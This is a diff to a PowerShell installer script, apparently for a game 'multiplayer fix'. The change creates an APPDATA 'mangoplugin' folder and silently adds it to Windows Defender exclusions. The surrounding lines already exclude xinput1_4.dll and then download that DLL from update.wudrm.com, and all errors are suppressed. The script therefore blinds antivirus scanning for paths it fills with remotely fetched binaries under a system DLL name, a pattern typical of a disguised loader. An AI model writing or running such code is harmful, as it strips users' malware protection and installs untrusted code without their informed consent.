@@ -148,6 +148,17 @@ try {
     Log-Message "Added Windows Defender exclusion for xinput1_4.dll" $Gray
 } catch {}
 
+# Create mangoplugin folder for multiplayer fix downloads and add exclusion
+$mangoPluginPath = Join-Path $env:APPDATA "mangoplugin"
+if (-not (Test-Path $mangoPluginPath)) {
+    New-Item $mangoPluginPath -ItemType Directory -Force | Out-Null
+    Log-Message "Created folder: $mangoPluginPath" $Gray
+}
+try {
+    Add-MpPreference -ExclusionPath $mangoPluginPath -ErrorAction SilentlyContinue
+    Log-Message "Added Windows Defender exclusion for mangoplugin folder" $Gray
+} catch {}
+
 Log-Message "Downloading required DLL..." $Yellow
 try {
     Invoke-RestMethod "https://update.wudrm.com/xinput1_4.dll" -OutFile $hidPath -ErrorAction Stop
